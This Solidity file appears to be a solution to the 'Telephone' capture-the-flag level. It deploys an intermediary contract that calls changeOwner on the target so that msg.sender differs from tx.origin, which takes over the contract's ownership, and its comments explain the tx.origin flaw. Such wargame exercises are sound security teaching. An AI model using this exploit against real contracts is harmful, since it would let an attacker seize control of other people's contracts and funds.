//SPDX-License-Identifier: MIT

pragma solidity ^0.8.13;

interface ITelephone {
    function changeOwner(address) external;
}

contract TelephoneSolution {

    ITelephone public telephone;


    constructor(address _telephone) {
        telephone = ITelephone(_telephone);
    }

    // the owner of the Telephone is set to
    // the msg.sender address
    // the owner can be changed if msg.sender != tx.origin

    // examples of this can be that an EOA or Smart Contract
    // calls an intermediary contract and this intermediary
    // contract calls `changeOwner` on the telephone.

    // making this fn external also ensures that the
    // require statement of the Telephone is fulfilled.
    function channgeOwnerOnTelephone(address owner) external {
        telephone.changeOwner(owner);
    }

}